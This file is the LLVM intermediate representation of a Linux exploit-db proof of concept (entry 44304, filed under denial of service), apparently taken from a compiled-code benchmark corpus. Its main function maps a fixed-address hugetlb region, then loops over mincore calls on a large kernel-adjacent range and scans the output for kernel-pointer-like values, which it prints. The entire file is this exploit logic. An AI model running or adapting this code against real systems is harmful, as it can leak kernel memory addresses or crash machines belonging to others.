; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_44304.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_44304.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@PROT_NONE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_HUGETLB = common dso_local global i32 0, align 4
@MAP_NORESERVE = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"mincore\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"%p\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %7 = call i32 (...) @getpagesize()
  %8 = sext i32 %7 to i64
  %9 = udiv i64 %8, 1
  %10 = call i8* @llvm.stacksave()
  store i8* %10, i8** %2, align 8
  %11 = alloca i8, i64 %9, align 16
  store i64 %9, i64* %3, align 8
  store i32 1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %12 = load i32, i32* @PROT_NONE, align 4
  %13 = load i32, i32* @MAP_SHARED, align 4
  %14 = load i32, i32* @MAP_ANONYMOUS, align 4
  %15 = or i32 %13, %14
  %16 = load i32, i32* @MAP_HUGETLB, align 4
  %17 = or i32 %15, %16
  %18 = load i32, i32* @MAP_NORESERVE, align 4
  %19 = or i32 %17, %18
  %20 = call i64 @mmap(i8* inttoptr (i64 1711276032 to i8*), i32 0, i32 %12, i32 %19, i32 -1, i32 0)
  %21 = load i64, i64* @MAP_FAILED, align 8
  %22 = icmp eq i64 %20, %21
  br i1 %22, label %23, label %25

23:                                               ; preds = %0
  %24 = call i32 @err(i32 1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  br label %25

25:                                               ; preds = %23, %0
  br label %26

26:                                               ; preds = %55, %25
  %27 = load i32, i32* %4, align 4
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %29, label %56

29:                                               ; preds = %26
  %30 = call i64 @mincore(i8* inttoptr (i64 2248146944 to i8*), i32 16777216, i8* %11)
  %31 = icmp ne i64 %30, 0
  br i1 %31, label %32, label %34

32:                                               ; preds = %29
  %33 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  br label %34

34:                                               ; preds = %32, %29
  store i32 0, i32* %6, align 4
  br label %35

35:                                               ; preds = %52, %34
  %36 = load i32, i32* %6, align 4
  %37 = sext i32 %36 to i64
  %38 = call i32 (...) @getpagesize()
  %39 = sext i32 %38 to i64
  %40 = udiv i64 %39, 1
  %41 = icmp ult i64 %37, %40
  br i1 %41, label %42, label %55

42:                                               ; preds = %35
  %43 = load i32, i32* %6, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %11, i64 %44
  %46 = bitcast i8* %45 to i64*
  %47 = load i64, i64* %46, align 1
  store i64 %47, i64* %5, align 8
  %48 = load i64, i64* %5, align 8
  %49 = icmp ugt i64 %48, -4294967296
  br i1 %49, label %50, label %51

50:                                               ; preds = %42
  store i32 0, i32* %4, align 4
  br label %57

51:                                               ; preds = %42
  br label %52

52:                                               ; preds = %51
  %53 = load i32, i32* %6, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %6, align 4
  br label %35

55:                                               ; preds = %35
  br label %26

56:                                               ; preds = %26
  br label %57

57:                                               ; preds = %56, %50
  %58 = load i64, i64* %5, align 8
  %59 = call i32 @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i64 %58)
  store i32 0, i32* %1, align 4
  %60 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %60)
  %61 = load i32, i32* %1, align 4
  ret i32 %61
}

declare dso_local i32 @getpagesize(...) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i64 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i64 @mincore(i8*, i32, i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @printf(i8*, i64) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
